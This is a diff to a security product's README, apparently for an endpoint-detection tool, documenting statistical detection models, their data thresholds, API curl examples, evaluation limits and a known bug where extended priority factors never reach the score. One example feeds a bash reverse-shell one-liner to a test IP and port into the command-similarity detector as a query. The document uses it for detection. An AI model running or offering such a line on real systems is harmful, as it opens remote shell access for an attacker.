@@ -67,6 +67,44 @@ numbers regress below the gates shown. Numbers are from a seeded run on this rep
 - Learning includes whatever traffic arrives, including attacker activity; a persistent attacker
   becomes part of the baseline over time. `POST /v1/ml/reset` and replay are provided for that case.
 - The existing heuristic AI modules (`ai_platform.go`) are unchanged and independent.
+
+### Per-model reference
+
+| Model | Method | Inputs | State and caps | Below the minimum |
+|---|---|---|---|---|
+| Lineage | Markov chain over (parent basename, child basename), Lidstone smoothing 0.5 | process events | 64 hosts, 1,000 edges per host, 5,000 fleet edges, names cut to 64 chars | `status: "not_enough_data"`, empty `transitions`, `sample_count` and `min_samples` shown |
+| Command similarity | char 3-5-gram hashed vectors (2^14 dims), cosine, "similar to known bad" at 0.70 (`mlSimThreshold`) | `q` (up to 2,048 chars); per-host history reservoir of 128 vectors (64 non-zero features each), 32 hosts | exemplars compiled at start from process-rule positive samples | `history.status: "not_enough_data"` until the host has 20 vectors; without `host=` the history block is `not_requested`; "familiar" means top similarity >= 0.9 |
+| Baselines | per-host, per-metric EWMA mean/variance in 168 hour-of-week slots, z >= 3.0 | exec count, new-destination count, file-event burst; destinations tracked as a hashed set of up to 4,096 | JSON state, atomic write | a metric is not scored until 48 closed hours and 4 slot samples; the open hour is shown as partial |
+
+Learned-event counts per kind are in `GET /v1/ml/status` (`learned_events`). Every response carries `method`.
+
+### Worked examples
+
+```sh
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/status"
+# {"method":"statistical, learned from this deployment","learned_events":{...},"updated":"...",
+#  "models":{"lineage":{"sample_count":..,"ready":true,"status":"ok",...},
+#            "command_similarity":{"exemplar_count":..,"ready":true,...},
+#            "baselines":{"hosts":..,"hosts_ready":..,"min_closed_hours":48,"ready":false,"status":"not_enough_data"}}}
+
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/lineage?host=ws-01&limit=5"
+# {"method":..., "scope":"host", "host":"ws-01", "min_samples":100, "sample_count":412, "fleet_sample_count":9021,
+#  "surprisal_threshold_bits":7, "smoothing":0.5, "status":"ok",
+#  "transitions":[{"parent":"winword.exe","child":"powershell.exe","count":1,"surprisal":8.4,"fleet_surprisal":9.1,"novel":true,"parent_seen":true}]}
+
+curl -s -G -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/similar" \
+  --data-urlencode 'q=bash -i >& /dev/tcp/198.51.100.7/4444 0>&1' --data-urlencode 'host=ws-01'
+# {"threshold":0.7,"exemplar_count":..,"exemplar_neighbours":[{"similarity":0.93,"rule_id":"...","technique":"T1059.004",...}],
+#  "similar_to_known_bad":true,"history":{"host":"ws-01","status":"not_enough_data","sample_count":7,"min_samples":20}}
+
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/baseline?host=ws-01"
+```
+
+Values above are illustrative of the shape; the numbers depend on your telemetry.
+
+### Evaluation and limits (summary)
+
+The numbers in the Evaluation table are from seeded synthetic fixtures and enforced as regression gates, not measured on real fleets. Concretely not covered: a never-seen parent process (0% detection by design), near-miss commands (26.6% false positives against the near-miss negatives), real traffic seasonality beyond a week-of-hours pattern, and a baseline poisoned by an attacker who is active during learning. Not-enough-data is a first-class result: a model below its minimum returns `status: "not_enough_data"` with the counts, never a score.
 <!-- END behaviour-models -->
 
 <!-- BEGIN extended-models -->
@@ -142,4 +180,34 @@ present factors as before.
   It cannot tell a noisy rule from a rule firing on a real, ongoing incident; the "trend up" suggestion says so.
 - Domain names are stored for flagged windows and in the open window (capped, 64 per window); nothing else
   retains raw DNS names. Counts only otherwise.
+
+### Per-model reference
+
+| Model | Method | State and caps | Not-enough-data behaviour |
+|---|---|---|---|
+| DNS | 300 s event-time windows, per registrable domain a hashed-subdomain set (128 per domain, 64 domains per open window), tunneling flagged at score >= 60 with >= 20 distinct subdomains, DGA burst at >= 5 DGA-like domains and score >= 50 | 20 flagged windows kept per host; 128 hosts overall | host reports `not_enough_data` until 50 lookups |
+| User | first-occurrence deviations (hour, new host, rare process) judged before learning | 256 users, 24 hour bins, 64 hosts and 200 basenames per user; 20 anomalies kept per user | hour and host checks need 30 successful logons, rare-process needs 100 process events |
+| Peers | Jensen-Shannon divergence of a host's mix against the mean of the other ready hosts, robust z >= 3.5 | vocabulary 200 items per host, destinations 96 | per host 50 process (20 network) events; a view needs 5 ready hosts |
+| Fatigue | weighted factors over 30 days of findings plus feedback verdicts, retune candidate at score >= 60 | stateless (computed per request) | rule needs 10 hits in 30 days (`mlFatMinHits30d`), verdict factor needs 5 decided verdicts |
+
+All four share the `<store>.mlext.json` state (version 1, saved at most every 30 s, polled every 2 s, at most 50,000 events per poll); fatigue is recomputed from findings and feedback.
+
+### Worked examples
+
+```sh
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/dns?host=ws-01&limit=5"
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/users?user=alice"
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/peers?host=db-01"
+curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/fatigue?candidates=1&limit=10"
+# fatigue: {"method":..., "model":"alert-fatigue-v1", "mode":"observe-only", "min_hits_30d":10,
+#  "retune_score_threshold":60, "min_verdicts":5, "weights":{...}, "rules_evaluated":N,
+#  "rules_with_enough_data":M, "retune_candidates":K, "status":"ok"|"not_enough_data",
+#  "rules":[{"rule":"...","status":"ok","score":92.4,"retune":true,...}]}
+```
+
+`?rule=<id>` returns that rule only (404 `{"error":"rule has no findings"}` when it has none). All four return `status: "not_enough_data"` with the observed counts instead of a score when the guard above is not met. Shapes beyond the fatigue envelope are described by the field names in the code (`ml_ext_*.go`); values here are illustrative.
+
+### Known issue: extended priority factors and the score
+
+Reading `internal/edr/ml_net.go` against `ml_ext_engine.go`: `ctx.score` sums the weighted factors in its loop and only afterwards calls the extended-factor hook, which writes the four optional factors (`dns_anomaly`, `user_behaviour`, `peer_outlier`, `rule_fatigue`) into the local `vals` map. Nothing reads `vals` after that, so as the code stands these factors do not enter `score`, `coverage` or the returned `factors` list; only their omission notes (`omitted`) are returned. The unit test `TestMLExtPriorityFactors` calls the engine's `factors` function directly and so does not exercise this path. The description in "Priority fusion" above is the intended behaviour; treat the four extended factors as not influencing `/v1/ml/priority` until this is fixed. The `exposure` factor, which is evaluated before the loop, is not affected.
 <!-- END extended-models -->
